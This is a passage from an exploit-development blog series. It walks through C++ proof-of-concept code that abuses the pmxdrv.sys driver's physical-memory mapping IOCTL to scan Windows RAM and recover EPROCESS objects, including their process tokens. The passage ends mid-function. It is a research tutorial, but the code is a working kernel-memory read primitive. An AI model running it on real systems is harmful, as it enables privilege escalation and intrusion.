---
title: "Exploiting pmxdrv.sys (Part 4): Implementing the EPROCESS Scanner"
description: "Scanning physical memory, validating EPROCESS candidates, and inspecting the process objects collected"
date: 2026-09-28 00:00:00 +0800
categories: [Research, Windows]
tags: [drivers, pmxdrv.sys]
---

## Context

In the previous parts of this series, we worked through two separate problems involved in locating process objects from physical memory.

In [Part 2](/posts/pmxdrv-poc2-part-2/), we looked at how Windows process allocations appear in memory, identified the `Proc` pool tag, examined the relationship between the pool allocation and the `EPROCESS` structure, and built a set of checks for deciding whether a potential candidate actually looks like a process object.

In [Part 3](/posts/pmxdrv-poc2-part-3/), we then looked at where the PoC should search. Instead of blindly scanning the entire physical address space, the PoC obtains the physical-memory ranges described by Windows for subsequent scanning.

At this point, the individual pieces are falling in place:

```text
Windows-described physical memory ranges
         |
         v
Scan physical pages
         |
         v
Find "Proc" tags
         |
         v
Test candidate displacements
         |
         v
Validate EPROCESS fields
```
Rather than stopping after finding a single valid process object, the PoC will collect every `EPROCESS` candidate that passes validation.

Since Part 2 focused on the concepts, let's now implement them and see what process objects we can reliably recover from physical memory using the logic developed so far.

## A Short Recap of the Candidate Logic

The basic idea from Part 2 was:

```text
Proc pool allocation
        |
        v
Try possible pool-header-to-EPROCESS displacements
        |
        v
Interpret bytes as EPROCESS fields
        |
        v
Do the fields look internally consistent?
        |
     +--+--+
     |     |
    No    Yes
     |     |
 Reject   Keep
```

On the target Windows 10 build 19045, once a `Proc` tag is found, the PoC tests candidate displacements from +0x40 to +0x100 in increments of +0x10. The candidate first has to pass the build-specific 0x00000003 start marker pre-filter established in Part 2. The PoC then extracts and checks:
1. `UniqueProcessId`
2. `ActiveProcessLinks.Flink`
3. `ActiveProcessLinks.Blink`
4. `Token`
5. `ImageFileName`

## Representing an EPROCESS Candidate

Once a candidate has passed validation, the PoC needs somewhere to store the information that was recovered from it. Rather than keeping only the physical address of the `_EPROCESS`, we use a structure to store the metadata that helps us understand why the candidate was accepted. The `EPROCESS` candidate structure is defined as:

```cpp
typedef struct _EPROCESS_CANDIDATE {
    UINT64 HeaderPhysicalAddress;
    UINT64 EprocessPhysicalAddress;
    UINT64 HeaderToEprocess;
    UINT64 Pid;
    UINT64 Flink;
    UINT64 Blink;
    UINT64 TokenRaw;
    char   ImageFileName[EPROCESS_IMAGE_LENGTH + 1];
} EPROCESS_CANDIDATE;
```

The main idea is that each accepted result contains both:
1. Information about where the object was found; and
2. Information extracted from the object itself.

This is especially useful for debugging and for selecting a particular process of interest later.

## The High-Level Scanner

`FindEprocessCandidates()` is the high-level scanner that scans the Windows-described physical memory ranges returned by `LoadPhysicalMemoryRanges()` and produces a list `EPROCESS` candidates that pass the validation checks described in Part 2. Several nested loops are used for it to perform this function.

The easiest way to understand it is to think of the scanner as gradually zooming in:

```text
Physical memory ranges
        ↓
Chunks
        ↓
Pages
        ↓
Possible pool headers
        ↓
Possible EPROCESS locations
        ↓
Validation checks
        ↓
Collect valid EPROCESS candidates
```

Each loop simply narrows the search one level further.

## Loop 1: Walk Physical Memory Ranges

`FindEprocessCandidates()` first walks the ranges returned by `LoadPhysicalMemoryRanges()` from Part 3. The scanner begins at physical address 0x100000 (1 MB), deliberately skipping addresses below that boundary. At this level, the PoC is not looking for `Proc` tags yet. It questions: **Which physical range should I scan next?**

## Loop 2: Split Each Range into Chunks

Instead of mapping an entire range, each range is processed in chunks of 1 MB (256 pages x 4 KB = 1 MB per chunk), so a normal mapping covers 1 MB of physical memory. For the final part of a range, the scanner uses only the remaining bytes.

Conceptually:

```text
Physical range
0x100000 -------------------------------------- rangeEnd

        1 MB       1 MB       1 MB
      +---------+ +---------+ +---------+ +----+
      | chunk 0 | | chunk 1 | | chunk 2 | |... |
      +---------+ +---------+ +---------+ +----+
          |
          v
      map chunk
```

The scanner maps one chunk through `pmxdrv.sys`, processes it, unmaps it, and then moves to the next chunk. This keeps the amount of physical memory mapped at one time relatively small. At this level, the PoC questions: **Which chunk in this physical range should I map next?**

## Loop 3: Walk the Pages Inside the Chunk

A 1 MB chunk contains 256 normal 4 KB pages. After a chunk has been mapped, the scanner processes those pages one by one:

```text
1 MB chunk

+--------+--------+     +--------+
| Page 0 | Page 1 | ... |Page 255|
+--------+--------+     +--------+
   4 KB     4 KB           4 KB
 ```

Each page is passed to the page scanner, `ScanPageForCandidates()`, where the search starts becoming more specific. Instead of thinking about megabytes of physical memory, the PoC is now examining one 4 KB page at a time. The PoC now questions: **Which page in this chunk should I investigate?**

## Loop 4: Check Possible Pool Headers

Inside each page, the PoC looks for possible pool headers by checking locations at 16-byte intervals:

```text
4 KB page

+0x000
+0x010
+0x020
+0x030
+0x040
...
```

At each location, it checks whether the pool tag contains `Proc`. Locations that do not are immediately skipped. When a `Proc` tag is found, there is something worth investigating further. The PoC questions: **Which location in this page contains a `Proc` tag?**

## Loop 5: Try Possible EPROCESS Locations

Finding a `Proc` allocation still does not tell us exactly where the `_EPROCESS` begins. As detailed in Part 2, the observed distance between the pool header and `_EPROCESS` varies. The PoC therefore tests candidate displacements from +0x40 through +0x100. Each resulting location is passed to `BuildCandidateFromPage()`, which checks whether the fields at that location are consistent with a valid `_EPROCESS`.

The question at this final loop level is: **Which displacement from this pool header contains an `EPROCESS`?** If a candidate fails validation, the scanner tries the next displacement. If it passes, the candidate is saved.

## Putting the Loops Together

The full search can therefore be understood as a series of increasingly focused questions:

```text
Which physical range? (Loop 1)
        |
        v
Which 1 MB chunk? (Loop 2)
        |
        v
Which 4 KB page? (Loop 3)
        |
        v
Which 16-byte-aligned pool header? (Loop 4)
        |
        v
Is the tag "Proc"?
        |
       yes
        |
        v
Which candidate displacement? (Loop 5)
        |
        v
Does this look like EPROCESS?
        |
       yes
        |
        v
Store candidate
```

Another way to visualize it is:

```text
FOR EACH physical range (Loop 1)
    |
    +-- FOR EACH chunk (Loop 2)
            |
            +-- FOR EACH page (Loop 3)
                    |
                    +-- FOR EACH possible pool header (Loop 4)
                            |
                            +-- if tag == "Proc"
                                    |
                                    +-- FOR EACH displacement (Loop 5)
                                            |
                                            +-- validate candidate
```

## What Happens to a Valid Candidate?

Once `BuildCandidateFromPage()` accepts a candidate, the PoC checks whether the same physical `EPROCESS` address has already been collected before adding it to the candidate list. This prevents the final list from containing multiple entries that refer to the same physical `EPROCESS` address. A successful candidate is then appended to the collection created by `FindEprocessCandidates()`:

```text
Validated candidates

[0] EPROCESS candidate
[1] EPROCESS candidate
[2] EPROCESS candidate
[3] EPROCESS candidate
...
```

## Let's Find EPROCESS Candidates

Current state of the PoC:

```cpp
#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <algorithm>
#include <vector>

#define PAGE_SIZE_BYTES               0x1000ULL
#define CM_RESOURCE_TYPE_MEMORY       3
#define CM_RESOURCE_TYPE_MEMORY_LARGE 7
#define RESOURCE_LIST_HEADER_SIZE     0x14
#define RESOURCE_DESCRIPTOR_SIZE      0x14

// pmxdrv.sys interface reconstructed in the earlier research stages.
#define DEVICE_NAME                 "\\\\.\\PMXDRV"
#define IOCTL_MAP_PHYSICAL          0x00222AB8

#define SCAN_START                  0x00100000ULL
#define SCAN_CHUNK_PAGES            256UL
#define SCAN_CHUNK_BYTES            (SCAN_CHUNK_PAGES * PAGE_SIZE_BYTES)

// Little-endian representation of the nonpaged-pool tag "Proc".
#define POOL_TAG_PROC               0x636F7250UL

// Windows 10 build 19045 x64 EPROCESS offsets.
#define EPROCESS_PID                0x440
#define EPROCESS_ACTIVE_LINKS       0x448
#define EPROCESS_TOKEN              0x4B8
#define EPROCESS_IMAGE              0x5A8
#define EPROCESS_IMAGE_LENGTH       15
#define EPROCESS_IMAGE_MAX_CHARS    (EPROCESS_IMAGE_LENGTH - 1)

// Build 19045 candidates begin with this observed DWORD at offset +0x00.
#define EPROCESS_START_MARKER     0x00000003UL

#define EPROCESS_REL_MIN            0x40
#define EPROCESS_REL_MAX            0x100
#define EPROCESS_REL_STEP           0x10

// EPROCESS.Token is an EX_FAST_REF: pointer in the upper 60 bits and a live
// cached-reference count in the low four bits.
#define EX_FAST_REF_POINTER_MASK    0xFFFFFFFFFFFFFFF0ULL
#define EX_FAST_REF_LOW_BITS_MASK   0xFULL

typedef struct _PHYSICAL_RANGE {
    UINT64 Start;
    UINT64 Length;
} PHYSICAL_RANGE;

#pragma pack(push, 1)

typedef struct _PMX_MAP_REQUEST {
    DWORD  Size;
    UINT64 PhysicalAddress;
    DWORD  PageCount;
    UINT64 MappedAddress;
} PMX_MAP_REQUEST;

typedef struct _PMX_IOCTL_INPUT {
    UINT64 RequestAddress;
    DWORD  Flag;
    DWORD  Unknown;
} PMX_IOCTL_INPUT;

#pragma pack(pop)

static_assert(sizeof(PMX_MAP_REQUEST) == 24, "PMX_MAP_REQUEST packing changed");
static_assert(sizeof(PMX_IOCTL_INPUT) == 16, "PMX_IOCTL_INPUT packing changed");

typedef struct _EPROCESS_CANDIDATE {
    UINT64 HeaderPhysicalAddress;
    UINT64 EprocessPhysicalAddress;
    UINT64 HeaderToEprocess;
    UINT64 Pid;
    UINT64 Flink;
    UINT64 Blink;
    UINT64 TokenRaw;
    char   ImageFileName[EPROCESS_IMAGE_LENGTH + 1];
} EPROCESS_CANDIDATE;

// Function-pointer type for dynamically resolving ntdll!NtUnmapViewOfSection.
typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE ProcessHandle, PVOID BaseAddress);

// Safely reads an 8-byte UINT64 from a byte buffer using memcpy.
// It is mainly used while interpreting raw physical-memory data as EPROCESS fields.
static UINT64 ReadU64(const BYTE* p)
{
    UINT64 value = 0;
    memcpy(&value, p, sizeof(value));
    return value;
}

// Same idea as ReadU64(), but reads a 4-byte DWORD.
// It is used for things such as pool headers, pool tags, and ResourceMap fields.
static DWORD ReadU32(const BYTE* p)
{
    DWORD value = 0;
    memcpy(&value, p, sizeof(value));
    return value;
}

static BOOL LoadPhysicalMemoryRanges(std::vector<PHYSICAL_RANGE>* ranges)
{
    if (!ranges)
        return FALSE;

    ranges->clear();

    HKEY key = NULL;

    // Open Windows hardware resource map
    LSTATUS status = RegOpenKeyExA(
        HKEY_LOCAL_MACHINE,
        "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
        0,
        KEY_QUERY_VALUE,
        &key);

    if (status != ERROR_SUCCESS) {
        printf("[-] RegOpenKeyExA for the physical memory map failed (%ld)\n", (long)status);
        return FALSE;
    }

    DWORD type = 0;
    DWORD size = 0;

    // Check size of the data
    status = RegQueryValueExA(
        key,
        ".Translated",
        NULL,
        &type,
        NULL,
        &size);

    if (status != ERROR_SUCCESS || type != REG_RESOURCE_LIST || size < RESOURCE_LIST_HEADER_SIZE) {
        printf("[-] Physical memory resource-list metadata is invalid\n");
        RegCloseKey(key);
        return FALSE;
    }

    // Allocate enough memory to hold data
    std::vector<BYTE> data(size);

    // Read .Translated
    status = RegQueryValueExA(
        key,
        ".Translated",
        NULL,
        &type,
        data.data(),
        &size);
    RegCloseKey(key);

    if (status != ERROR_SUCCESS || type != REG_RESOURCE_LIST ||
        size < RESOURCE_LIST_HEADER_SIZE) {
        printf("[-] Reading the physical memory resource list failed (%ld)\n", (long)status);
        return FALSE;
    }

    // Extract relevant fields from Windows resource structures
    DWORD resourceGroupCount = ReadU32(data.data()); // CM_RESOURCE_LIST.Count
    DWORD resourceDescriptorCount = ReadU32(data.data() + 0x10); // CM_PARTIAL_RESOURCE_LIST.Count

    if (resourceGroupCount != 1 || resourceDescriptorCount == 0 ||
        resourceDescriptorCount > (size - RESOURCE_LIST_HEADER_SIZE) / RESOURCE_DESCRIPTOR_SIZE) {
        printf("[-] Unexpected physical memory resource-list layout\n");
        return FALSE;
    }

    // Parse each CM_PARTIAL_RESOURCE_DESCRIPTOR entry
    for (DWORD i = 0; i < resourceDescriptorCount; i++) {
        const BYTE* descriptor = data.data() + RESOURCE_LIST_HEADER_SIZE + ((SIZE_T)i * RESOURCE_DESCRIPTOR_SIZE);

        // Identify the descriptors that represent memory
        DWORD header = ReadU32(descriptor);
        BYTE resourceType = (BYTE)(header & 0xFF);

        if (resourceType != CM_RESOURCE_TYPE_MEMORY && resourceType != CM_RESOURCE_TYPE_MEMORY_LARGE) {
            continue;
        }

        // Extract Start and Length of memory region
        UINT64 start = ReadU64(descriptor + 4);
        UINT64 length = ReadU64(descriptor + 0x0C);

        // Decodes large-memory encodings
        if ((header & 0xFF000000UL) != 0) {
            if (length > (UINT64_MAX >> 8)) {
                printf("[-] Overflow decoding a physical memory range\n");
                return FALSE;
            }
            length <<= 8;
        }

        // Checks for:
        // 1) empty ranges
        // 2) arithmetic that overflows 64-bit address
        // 3) Start not aligned to 4-KB page boundaries
        // 4) length not aligned to 4-KB page boundaries
        if (length == 0 || start > UINT64_MAX - (length - 1) ||
            (start & (PAGE_SIZE_BYTES - 1)) != 0 ||
            (length & (PAGE_SIZE_BYTES - 1)) != 0) {
            printf("[-] Invalid physical memory range in resource list\n");
            return FALSE;
        }

        // Save valid physical memory range
        PHYSICAL_RANGE range = {};
        range.Start = start;
        range.Length = length;
        ranges->push_back(range);
    }

    if (ranges->empty()) {
        printf("[-] No RAM ranges were present in the resource list\n");
        return FALSE;
    }

    // Sort ranges
    std::sort(
        ranges->begin(),
        ranges->end(),
        [](const PHYSICAL_RANGE& left, const PHYSICAL_RANGE& right) {
            return left.Start < right.Start;
        });

    // Print all physical memory ranges
    printf("[*] Physical RAM ranges from Windows ResourceMap:\n");
    UINT64 totalBytes = 0;

    for (SIZE_T i = 0; i < ranges->size(); i++) {
        const PHYSICAL_RANGE& range = (*ranges)[i];
        printf("    [%zu] 0x%016llX - 0x%016llX  (%llu MB)\n",
            i,
            (unsigned long long)range.Start,
            (unsigned long long)(range.Start + range.Length - 1),
            (unsigned long long)(range.Length / (1024ULL * 1024ULL)));

        if (totalBytes <= UINT64_MAX - range.Length)
            totalBytes += range.Length;
    }

    printf("    Total described RAM: %llu MB\n\n", (unsigned long long)(totalBytes / (1024ULL * 1024ULL)));
    return TRUE;
}

// Opens \\.\PMXDRV with CreateFileA().
// The returned handle is used for the IOCTL that exposes the physical-memory mapping primitive.
static HANDLE OpenDriver(void)
{
    printf("[*] Opening %s...\n", DEVICE_NAME);

    HANDLE driver = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (driver == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open device (error %lu)\n",
            (unsigned long)GetLastError());
        return INVALID_HANDLE_VALUE;
    }

    printf("[+] Device opened successfully\n");
    return driver;
}

// This is the lowest-level interface to the vulnerable driver behavior.
// It builds the reconstructed request structures, sends IOCTL 0x00222AB8, and receives the
// user-mode address at which the requested physical pages were mapped.
static UINT64 MapPhysicalMemory(
    HANDLE driver,
    UINT64 physicalAddress,
    DWORD pageCount)
{
    // The IOCTL receives a pointer to this packed 24-byte request. The driver
    // writes the user-mode mapping address back into MappedAddress.
    PMX_MAP_REQUEST* request = (PMX_MAP_REQUEST*)VirtualAlloc(
        NULL,
        sizeof(PMX_MAP_REQUEST),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    if (!request) {
        printf("[-] VirtualAlloc failed (error %lu)\n", (unsigned long)GetLastError());
        return 0;
    }

    request->Size = sizeof(PMX_MAP_REQUEST);
    request->PhysicalAddress = physicalAddress & ~(PAGE_SIZE_BYTES - 1);
    request->PageCount = pageCount;
    request->MappedAddress = 0;

    PMX_IOCTL_INPUT input = {};
    input.RequestAddress = (UINT64)(uintptr_t)request;

    BOOL ok = DeviceIoControl(
        driver,
        IOCTL_MAP_PHYSICAL,
        &input,
        sizeof(input),
        NULL,
        0,
        NULL,
        NULL);

    UINT64 mappedAddress = request->MappedAddress;
    DWORD error = ok ? ERROR_SUCCESS : GetLastError();
    VirtualFree(request, 0, MEM_RELEASE);

    if (!ok) {
        printf("[-] DeviceIoControl failed (error %lu)\n", (unsigned long)error);
        return 0;
    }

    if (!mappedAddress) {
        printf("[-] IOCTL returned no mapped address\n");
        return 0;
    }

    return mappedAddress;
}

// Cleans up a mapped view created by MapPhysicalMemory() using NtUnmapViewOfSection()
static BOOL UnmapPhysicalMemory(UINT64 mappedAddress)
{
    static NtUnmapViewOfSection_t ntUnmapViewOfSection = NULL;

    if (!mappedAddress)
        return FALSE;

    if (!ntUnmapViewOfSection) {
        HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
        if (ntdll) {
            ntUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(ntdll, "NtUnmapViewOfSection");
        }
    }

    if (!ntUnmapViewOfSection) {
        printf("[-] Could not resolve NtUnmapViewOfSection\n");
        return FALSE;
    }

    NTSTATUS status = ntUnmapViewOfSection(GetCurrentProcess(), (PVOID)(uintptr_t)mappedAddress);

    if (status < 0) {
        printf("[-] NtUnmapViewOfSection failed (NTSTATUS 0x%08lX)\n", (unsigned long)(DWORD)status);
        return FALSE;
    }

    return TRUE;
}

// Turns the driver's page-mapping capability into a convenient arbitrary physical read primitive.
// It calculates which physical pages contain the requested bytes, maps them, copies the bytes out,
// and immediately unmaps the view.
static BOOL ReadPhysicalMemory(
    HANDLE driver,
    UINT64 physicalAddress,
    void* output,
    SIZE_T size)
{
    // pmxdrv.sys maps complete pages, so calculate the smallest page-aligned
    // view that contains the caller's requested byte range.
    if (!output || size == 0 ||
        physicalAddress > UINT64_MAX - (UINT64)(size - 1))
        return FALSE;

    UINT64 startPage = physicalAddress & ~(PAGE_SIZE_BYTES - 1);
    UINT64 lastAddress = physicalAddress + size - 1;
    UINT64 endPage = lastAddress & ~(PAGE_SIZE_BYTES - 1);
    UINT64 pages64 = ((endPage - startPage) / PAGE_SIZE_BYTES) + 1;

    if (pages64 == 0 || pages64 > MAXDWORD)
        return FALSE;

    UINT64 mapped = MapPhysicalMemory(driver, startPage, (DWORD)pages64);
    if (!mapped)
        return FALSE;

    SIZE_T offset = (SIZE_T)(physicalAddress - startPage);
    BOOL success = TRUE;

    __try {
        memcpy(output, (const void*)(uintptr_t)(mapped + offset), size);
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] Exception reading mapped memory (0x%08lX)\n", GetExceptionCode());
        success = FALSE;
    }

    if (!UnmapPhysicalMemory(mapped))
        success = FALSE;

    return success;
}

// Checks if pid is a non-zero 32-bit-sized value
static BOOL IsPlausiblePid(UINT64 pid)
{
    return pid > 0 && pid <= 0xFFFFFFFFULL;
}

// Checks if value represents a plausible x64 kernel virtual addres (i.e. 0xFFFF8xxx xxxxxxxx)
static BOOL IsPlausibleKernelPointer(UINT64 value)
{
    return value >= 0xFFFF800000000000ULL;
}

// Checks if image is nonempty and contains printable ASCII.
static BOOL IsPlausibleImage(const char* image)
{
    if (!image || image[0] == '\0')
        return FALSE;

    for (SIZE_T i = 0; i < EPROCESS_IMAGE_LENGTH && image[i] != '\0'; i++) {
        unsigned char c = (unsigned char)image[i];
        if (c < 0x20 || c > 0x7E)
            return FALSE;
    }

    return TRUE;
}

// Candidate validation function which asks:
// "If I treat the bytes at this displacement as an EPROCESS, do all the important fields
// look like a real process object?"
// Extracts fields at current displacement to perform 5 independent checks.
static BOOL BuildCandidateFromPage(
    const BYTE page[PAGE_SIZE_BYTES],
    UINT64 pagePhysicalAddress,
    SIZE_T headerOffset,
    SIZE_T displacement,
    EPROCESS_CANDIDATE* output)
{
    // Check for valid output vector
    if (!output)
        return FALSE;

    // Calculate start of EPROCESS structure
    SIZE_T eprocessOffset = headerOffset + displacement;

    // Calculate end of ImageFileName field since it is the furthest EPROCESS field to be read
    SIZE_T requiredEnd = eprocessOffset + EPROCESS_IMAGE + EPROCESS_IMAGE_LENGTH;

    // Check if the ImageFileName field is inside the current page
    if (requiredEnd > PAGE_SIZE_BYTES)
        return FALSE;

    // Reject a displacement before reading and validating the EPROCESS fields.
    if (ReadU32(page + eprocessOffset) != EPROCESS_START_MARKER)
        return FALSE;

    // Initialize a temporary local candidate
    EPROCESS_CANDIDATE candidate = {};

    // Record physical locations for correlation and validation
    candidate.HeaderPhysicalAddress = pagePhysicalAddress + headerOffset;
    candidate.EprocessPhysicalAddress = pagePhysicalAddress + eprocessOffset;
    candidate.HeaderToEprocess = displacement;

    // Extract EPROCESS fields
    candidate.Pid = ReadU64(page + eprocessOffset + EPROCESS_PID);
    candidate.Flink = ReadU64(page + eprocessOffset + EPROCESS_ACTIVE_LINKS);
    candidate.Blink = ReadU64(page + eprocessOffset + EPROCESS_ACTIVE_LINKS + 8);
    candidate.TokenRaw = ReadU64(page + eprocessOffset + EPROCESS_TOKEN);

    // Decode raw token to extract token pointer
    UINT64 tokenPointer = candidate.TokenRaw & EX_FAST_REF_POINTER_MASK;

    // Extract ImageFileName field
    memcpy(candidate.ImageFileName, page + eprocessOffset + EPROCESS_IMAGE, EPROCESS_IMAGE_LENGTH);
    candidate.ImageFileName[EPROCESS_IMAGE_LENGTH] = '\0';

    // Perform 5 independent checks on extracted fields
    BOOL pidValid = IsPlausiblePid(candidate.Pid);
    BOOL flinkValid = IsPlausibleKernelPointer(candidate.Flink) && (candidate.Flink & 7) == 0; // 8-byte aligned
    BOOL blinkValid = IsPlausibleKernelPointer(candidate.Blink) && (candidate.Blink & 7) == 0; // 8-byte aligned
    BOOL tokenValid = IsPlausibleKernelPointer(tokenPointer);
    BOOL imageValid = IsPlausibleImage(candidate.ImageFileName);

    // Return invalid condition if any of the 5 checks fails
    if (!pidValid || !flinkValid || !blinkValid || !tokenValid || !imageValid) {
        return FALSE;
    }

    // Return valid candidate
    *output = candidate;
    return TRUE;
}

// Checks if a candidate is already stored to prevent duplicates
static BOOL CandidateAlreadyStored(
    const std::vector<EPROCESS_CANDIDATE>& candidates,
    UINT64 eprocessPhysicalAddress)
{
    for (const EPROCESS_CANDIDATE& candidate : candidates) {
        if (candidate.EprocessPhysicalAddress == eprocessPhysicalAddress)
            return TRUE;
    }
    return FALSE;
}

// First stage scanner that finds places worth investigating within the given 4 KB physical memory page:
// 1. Searches for 16-byte-aligned pool headers carrying the "Proc" tag
// 2. Tests plausible EPROCESS locations associated with each "Proc" tag
// 3. Validates each location via BuildCandidateFromPage()
// 4. Checks if candidate is already stored via CandidateAlreadyStored()
// 5. Adds candidate to candidate list
static void ScanPageForCandidates(
    const BYTE page[PAGE_SIZE_BYTES],
    UINT64 pagePhysicalAddress,
    std::vector<EPROCESS_CANDIDATE>* candidates,
    SIZE_T* procTags)
{
    // Walks the page in 0x10-byte increments since pool headers are 16-byte aligned.
    // Pool tags are stored 4 bytes into the pool headers,
    // so at least 8 bytes must remain before reading off the pool tag.
    for (SIZE_T headerOffset = 0;
        headerOffset + 8 <= PAGE_SIZE_BYTES;
        headerOffset += 0x10) {

        // Read 4-byte pool tag
        DWORD tag = ReadU32(page + headerOffset + 4);

        // Skip if pool tag is not "Proc"
        if (tag != POOL_TAG_PROC)
            continue;

        // Count every "Proc" tag encountered
        (*procTags)++;

        // Tries the observed range of pool-header-to-EPROCESS displacement
        for (SIZE_T displacement = EPROCESS_REL_MIN;
            displacement <= EPROCESS_REL_MAX;
            displacement += EPROCESS_REL_STEP) {

            // Initialize an empty structure to collect valid EPROCESS objects
            EPROCESS_CANDIDATE candidate = {};

            // Check if location contains valid EPROCESS object
            if (!BuildCandidateFromPage(
                page,
                pagePhysicalAddress,
                headerOffset,
                displacement,
                &candidate)) {
                continue;
            }

            // Check if candidate is already stored
            if (CandidateAlreadyStored(
                *candidates,
                candidate.EprocessPhysicalAddress)) {
                continue;
            }

            // Store candidate in candidate list
            candidates->push_back(candidate);
        }
    }
}

// The high-level physical memory scanner
static BOOL FindEprocessCandidates(
    HANDLE driver,
    const std::vector<PHYSICAL_RANGE>& ranges,
    std::vector<EPROCESS_CANDIDATE>* candidates)
{
    // Check for valid output vector
    if (!candidates)
        return FALSE;

    // Start each scan with an empty candidate list
    candidates->clear();

    // Initialize stats for each memory range scan
    UINT64 pagesRead = 0;
    UINT64 pagesFailed = 0;
    SIZE_T procTags = 0;

    printf("[>] Scanning Windows-described RAM for validated Proc allocations...\n");

    // Map physical memory in 1 MB chunks instead of one 4 KB page at a time.
    // With SCAN_CHUNK_PAGES = 256, each normal mapping covers 1MB.
    printf("    Chunk size: %lu pages (%llu KB)\n",
        SCAN_CHUNK_PAGES,
        (unsigned long long)(SCAN_CHUNK_BYTES / 1024ULL));

    // Since EPROCESS body is not located at a fixed distance from Proc pool header, ScanPageForCandidates()
    // tests candidate EPROCESS locations from EPROCESS_REL_MIN through EPROCESS_REL_MAX.
    printf("    Candidate displacement: +0x%X through +0x%X, step +0x%X\n",
        EPROCESS_REL_MIN,
        EPROCESS_REL_MAX,
        EPROCESS_REL_STEP);

    // Show the build-specific pre-filter used by the scanner.
    printf("    EPROCESS start marker: 0x%08lX\n",
        (unsigned long)EPROCESS_START_MARKER);

    // Walk each Windows-described physical memory range obtained earlier from LoadPhysicalMemoryRanges()
    for (SIZE_T rangeIndex = 0; rangeIndex < ranges.size(); rangeIndex++) {
        const PHYSICAL_RANGE& range = ranges[rangeIndex];

        // Convert the range's start + length representation into an end address
        UINT64 rangeEnd = range.Start + range.Length;

        // Do not scan below SCAN_START. With SCAN_START = 0x100000, physical addresses below 1 MB are skipped
        UINT64 chunkStart = range.Start < SCAN_START ? SCAN_START : range.Start;

        // Skip if entire range is below SCAN_START
        if (chunkStart >= rangeEnd)
            continue;

        printf("    [RANGE %zu/%zu] 0x%016llX - 0x%016llX\n",
            rangeIndex + 1,
            ranges.size(),
            (unsigned long long)chunkStart,
            (unsigned long long)(rangeEnd - 1));

        // Baseline for the live progress indicator
        const UINT64 rangeScanStart = chunkStart;
        const UINT64 rangeScanSpan = rangeEnd - rangeScanStart;

        // Process the current physical memory range one mapping-sized chunk at a time until its end address is reached
        while (chunkStart < rangeEnd) {

            // Live progress, single updating line per range
            {
                UINT64 scanned = chunkStart - rangeScanStart;
                unsigned pct = rangeScanSpan != 0
                    ? (unsigned)((scanned * 100) / rangeScanSpan)
                    : 100;
                printf("\r        Progress: %3u%%  at PA 0x%016llX   ", pct, (unsigned long long)chunkStart);
                fflush(stdout);
            }

            // Check remaining bytes in current range
            UINT64 remaining = rangeEnd - chunkStart;

            // Scan SCAN_CHUNK_BYTES at a time. For the final chunk of a range, use only the remaining bytes.
            UINT64 chunkBytes = remaining < SCAN_CHUNK_BYTES ? remaining : SCAN_CHUNK_BYTES;

            // Convert the selected chunk size into a page count for MapPhysicalMemory() 
            // since pmxdrv.sys maps complete 4 KB pages.
            DWORD pageCount = (DWORD)(chunkBytes / PAGE_SIZE_BYTES);

            if (pageCount == 0)
                break;

            // Map chunk to user-mode virtual address space
            UINT64 mapped = MapPhysicalMemory(driver, chunkStart, pageCount);

            // Increment failed pages count and proceed to next chunk if mapping fails
            if (!mapped) {
                pagesFailed += pageCount;
                chunkStart += chunkBytes;
                continue;
            }

            // Assume mapped chunk is readable until exception raised below
            BOOL chunkReadable = TRUE;

            __try {
                const BYTE* chunk = (const BYTE*)(uintptr_t)mapped;

                // Break mapped chunk into 4 KB pages
                for (DWORD pageIndex = 0; pageIndex < pageCount; pageIndex++) {

                    // Virtual address of the current page
                    const BYTE* page = chunk + ((SIZE_T)pageIndex * PAGE_SIZE_BYTES);

                    // Corresponding physical address of the same page
                    UINT64 pagePhysicalAddress = chunkStart + ((UINT64)pageIndex * PAGE_SIZE_BYTES);

                    // Search current page for Proc pool tags and append valid EPROCESS candidates to list
                    ScanPageForCandidates(
                        page,
                        pagePhysicalAddress,
                        candidates,
                        &procTags);
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {

                // Report mapped chunk as unreadable if any of the pages are unreadable
                printf("\n[-] Exception scanning physical chunk at 0x%016llX (0x%08lX)\n",
                    (unsigned long long)chunkStart,
                    GetExceptionCode());
                chunkReadable = FALSE;
            }

            // Release mapped view created by every successful MapPhysicalMemory().
            // Failure to unmap is fatal as continuing leaves the scanner's mapping state uncertain.
            if (!UnmapPhysicalMemory(mapped)) {
                printf("\n[-] Mapping cleanup failed; aborting the scan\n");
                return FALSE;
            }

            // Update stats
            if (chunkReadable)
                pagesRead += pageCount;
            else
                pagesFailed += pageCount;

            // Proceed to next chunk in current physical memory range
            chunkStart += chunkBytes;
        }

        printf("\n");
    }

    // Report stats
    printf("\n[*] Scan summary:\n");
    printf("    Pages read successfully: %llu\n", (unsigned long long)pagesRead);
    printf("    Pages failed:            %llu\n", (unsigned long long)pagesFailed);
    printf("    Raw Proc tags:           %zu\n", procTags);

    // Annotate the rejection ratio
    if (procTags > 0) {
        double keptPct = (100.0 * (double)candidates->size()) / (double)procTags;
        printf("    Validated candidates:    %zu  (%.1f%% of raw tags passed the filter)\n",
            candidates->size(), keptPct);
    }
    else {
        printf("    Validated candidates:    %zu\n", candidates->size());
    }

    // Return TRUE only if at least one page was read successfully and no pages failed
    return pagesRead != 0 && pagesFailed == 0;
}

// Prints all validated EPROCESS candidates collected by FindEprocessCandidates().
static void PrintEprocessCandidates(
    const std::vector<EPROCESS_CANDIDATE>& candidates)
{
    printf("\n[*] Validated EPROCESS candidate list:\n");
    printf("    Total candidates: %zu\n", candidates.size());

    if (candidates.empty()) {
        printf("    [!] No validated EPROCESS candidates were collected\n");
        return;
    }

    for (SIZE_T i = 0; i < candidates.size(); i++) {
        const EPROCESS_CANDIDATE& candidate = candidates[i];

        // Proc pool tag is located four bytes into the pool header.
        UINT64 procTagPhysicalAddress = candidate.HeaderPhysicalAddress + 4;

        // Split the raw EX_FAST_REF into its pointer and reference bits.
        UINT64 tokenPointer = candidate.TokenRaw & EX_FAST_REF_POINTER_MASK;
